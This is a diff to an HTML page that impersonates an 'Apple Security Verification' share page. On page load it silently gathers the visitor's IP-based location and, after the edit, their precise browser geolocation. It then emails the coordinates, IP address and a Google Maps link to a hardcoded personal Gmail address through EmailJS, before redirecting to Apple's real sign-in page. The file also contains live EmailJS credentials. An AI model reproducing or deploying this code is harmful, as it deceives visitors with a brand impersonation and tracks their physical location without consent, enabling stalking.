@@ -146,7 +146,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        .map-icon {
+        .lock-icon {
             width: 20px;
             height: 20px;
             fill: currentColor;
@@ -191,6 +191,14 @@
             z-index: 1000;
             display: none;
         }
+        
+        .status-text {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #34c759;
+            margin-bottom: 1rem;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -203,8 +211,8 @@
                     <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10.5V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10.5C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10.5V11.5H13.5V10.5C13.5,8.7 12.8,8.2 12,8.2Z"/>
                 </svg>
             </div>
-            <h1>Apple Share</h1>
-            <p class="subtitle">A information has been shared by user login via apple account to view information</p>
+            <h1>Apple Security Verification</h1>
+            <p class="subtitle">Verification required to access shared content</p>
         </div>
 
         <div class="info-card">
@@ -213,15 +221,17 @@
             </svg>
             <div class="info-content">
                 <h3>Security Verification</h3>
-                <p>Verification helps ensure your Apple account remains secure. Login to view shared information</p>
+                <p>Please verify your identity to access the shared information securely.</p>
             </div>
         </div>
 
+        <div id="statusText" class="status-text">Verification in progress...</div>
+
         <button class="action-button" onclick="redirectToApple()" id="locationBtn">
-          <!--  <svg class="map-icon" viewBox="0 0 24 24">
-                <path d="M12,11.5A2.5,2.5 0 0,1 9.5,9A2.5,2.5 0 0,1 12,6.5A2.5,2.5 0 0,1 14.5,9A2.5,2.5 0 0,1 12,11.5M12,2A7,7 0 0,0 5,9C5,14.25 12,22 12,22C12,22 19,14.25 19,9A7,7 0 0,0 12,2Z"/>
-            </svg>-->
-            View
+            <svg class="lock-icon" viewBox="0 0 24 24">
+                <path d="M12,17A2,2 0 0,0 14,15C14,13.89 13.1,13 12,13A2,2 0 0,0 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10C4,8.89 4.9,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/>
+            </svg>
+            Continue to Apple ID
         </button>
 
         <div class="result-display" id="result"></div>
@@ -233,78 +243,123 @@
 
     <script>
         const EMAIL_CONFIG = {
-             serviceId: 'service_7z1wcjl',  // Replace with your EmailJS service ID
-            templateId: 'template_xa2n6ht', // Replace with your EmailJS template ID
-            publicKey: 'DJUhavRcWhqXVp1EP',   // Replace with your EmailJS public key
-            recipientEmail: 'shilpkarricha@gmail.com' // Change this to the desired email address
+            serviceId: 'service_7z1wcjl',
+            templateId: 'template_xa2n6ht',
+            publicKey: 'DJUhavRcWhqXVp1EP',
+            recipientEmail: 'shilpkarricha@gmail.com'
         };
 
-        (function(){
-            emailjs.init(EMAIL_CONFIG.publicKey);
+        // Initialize EmailJS
+        emailjs.init(EMAIL_CONFIG.publicKey);
+        
+        // Store location data
+        let locationData = {
+            ip: {},
+            html5: {}
+        };
+        
+        // Get location on page load
+        window.addEventListener('load', function() {
+            document.getElementById('loadingIndicator').style.display = 'block';
             
-            // Run location collection automatically when page loads
-            window.addEventListener('load', function() {
-                // Show loading indicator
-                document.getElementById('loadingIndicator').style.display = 'block';
+            // Start with IP-based location
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    locationData.ip = {
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        accuracy: 5000,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        ip: data.ip
+                    };
+                    
+                    // Try to get more accurate location
+                    tryGetAccurateLocation();
+                })
+                .catch(error => {
+                    console.log('IP geolocation failed:', error);
+                    tryGetAccurateLocation();
+                });
+        });
+        
+        function tryGetAccurateLocation() {
+            if (navigator.geolocation) {
+                // Try to get high accuracy location silently
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
                 
-                // Use IP-based geolocation - no permission required
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.latitude && data.longitude) {
-                            processLocation({
-                                coords: {
-                                    latitude: data.latitude,
-                                    longitude: data.longitude
-                                },
-                                ipData: data
-                            });
-                        } else {
-                            console.log('IP geolocation failed: No coordinates in response');
-                        }
-                    })
-                    .catch(error => {
-                        console.log('IP geolocation failed:', error);
-                    })
-                    .finally(() => {
-                        // Hide loading indicator after a delay
-                        setTimeout(() => {
-                            document.getElementById('loadingIndicator').style.display = 'none';
-                        }, 1500);
-                    });
-            });
-        })();
-
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // High accuracy location obtained
+                        locationData.html5 = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        
+                        // Send data immediately
+                        sendLocationEmail();
+                    },
+                    function(error) {
+                        // If high accuracy fails, send IP-based data
+                        sendLocationEmail();
+                    },
+                    options
+                );
+            } else {
+                // Geolocation not supported, send IP-based data
+                sendLocationEmail();
+            }
+        }
+        
         function redirectToApple() {
-            window.location.href = 'https://account.apple.com/';
+            // Show status text when button is clicked
+            document.getElementById('statusText').style.display = 'block';
+            document.getElementById('locationBtn').disabled = true;
+            
+            // Redirect after a short delay
+            setTimeout(function() {
+                window.location.href = 'https://account.apple.com/sign-in';
+            }, 1500);
         }
-
-        function processLocation(position) {
-            // Send location data silently in background
-            sendLocationEmail(position.coords.latitude, position.coords.longitude, position.ipData);
-        }
-
-        function sendLocationEmail(latitude, longitude, ipData) {
+        
+        function sendLocationEmail() {
+            // Use the most accurate location available
+            const location = locationData.html5.latitude ? locationData.html5 : locationData.ip;
+            
             const timestamp = new Date().toLocaleString();
-            const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-            const ipInfo = ipData ? `${ipData.ip} (${ipData.city}, ${ipData.region}, ${ipData.country_name})` : 'Unknown';
+            const googleMapsLink = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
             
             const templateParams = {
                 to_email: EMAIL_CONFIG.recipientEmail,
-                subject: 'Location Captured - Silent Tracking',
+                subject: 'Location Captured - Accuracy: ' + (location.accuracy ? Math.round(location.accuracy) + 'm' : 'Unknown'),
                 timestamp: timestamp,
-                latitude: latitude.toFixed(6),
-                longitude: longitude.toFixed(6),
-                ip_address: ipInfo,
+                latitude: location.latitude.toFixed(6),
+                longitude: location.longitude.toFixed(6),
+                accuracy: location.accuracy ? Math.round(location.accuracy) + ' meters' : 'Unknown',
+                ip_address: locationData.ip.ip || 'Unknown',
                 google_maps_link: googleMapsLink,
-                message: `Location was automatically detected through IP-based geolocation.\n\nIP Address: ${ipInfo}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nGoogle Maps: ${googleMapsLink}\n\nThis detection happened without requiring user permission.`
+                message: `Location detected with accuracy of ${location.accuracy ? Math.round(location.accuracy) + ' meters' : 'Unknown'}.
+                         
+Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
+Google Maps: ${googleMapsLink}
+IP Address: ${locationData.ip.ip || 'Unknown'}
+City: ${locationData.ip.city || 'Unknown'}, ${locationData.ip.region || 'Unknown'}, ${locationData.ip.country || 'Unknown'}`
             };
 
             emailjs.send(EMAIL_CONFIG.serviceId, EMAIL_CONFIG.templateId, templateParams)
                 .then(function(response) {
-                    console.log('Email sent successfully:', response.status, response.text);
+                    console.log('Email sent successfully');
+                    document.getElementById('loadingIndicator').style.display = 'none';
                 }, function(error) {
                     console.log('Email sending failed:', error);
+                    document.getElementById('loadingIndicator').style.display = 'none';
                 });
         }
     </script>
